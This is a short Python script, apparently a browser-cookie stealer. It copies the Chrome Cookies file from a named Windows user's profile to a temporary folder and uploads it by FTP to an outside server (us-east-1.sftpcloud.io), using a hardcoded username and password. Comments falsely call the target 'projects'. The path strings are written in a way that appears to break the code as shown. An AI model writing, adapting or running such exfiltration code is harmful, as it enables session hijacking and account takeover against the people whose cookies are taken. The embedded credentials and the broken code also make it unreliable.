import os
import shutil
from ftplib import FTP

# FTP server details
FTP_HOST = "us-east-1.sftpcloud.io"
FTP_USERNAME = "d45b8e2d698147e59f2234fd87b98082"
FTP_PASSWORD = "CHbEN9bcriLn1f8X5pBzc66ZZsgrIa3p"

# Directories to work with
source_directory_1 = "C:\Users\Muhammad\AppData\Local\Google\Chrome\User Data\Profile 1\Network\Cookies"
source_directory_2 = "C:\Users\Muhammad\AppData\Local\Google\Chrome\User Data\Profile 1\Network\Cookies"

# FTP function to upload files
def upload_to_ftp(file_path, file_name):
    ftp = FTP(FTP_HOST)
    ftp.login(FTP_USERNAME, FTP_PASSWORD)
    ftp.cwd('/')  # This ensures that the current working directory is set to the root '/'
    with open(file_path, 'rb') as file:
        ftp.storbinary(f'STOR {file_name}', file)  # Upload the file
    ftp.quit()  # Close the FTP connection
    print(f"Uploaded {file_name} to FTP.")

# Step 1 & 2: Check if the first file exists, then copy and upload
if os.path.exists(source_directory_1):
    file_name = os.path.basename(source_directory_1)
    temp_path = os.path.join("/tmp", file_name)
    shutil.copy(source_directory_1, temp_path)  # Copy the file to a temporary location
    upload_to_ftp(temp_path, file_name)  # Upload the file from the temporary location
    os.remove(temp_path)  # Clean up the temporary file
else:
    print("The directory or file in 'projects' does not exist.")

# Step 3 & 4: Check for the second directory and ignore if it doesn't exist
if os.path.exists(source_directory_2):
    print("Project2 directory exists.")  # Just a placeholder, actual upload code for this directory could be similar
else:
    print("Project2 folder does not exist, ignoring.")
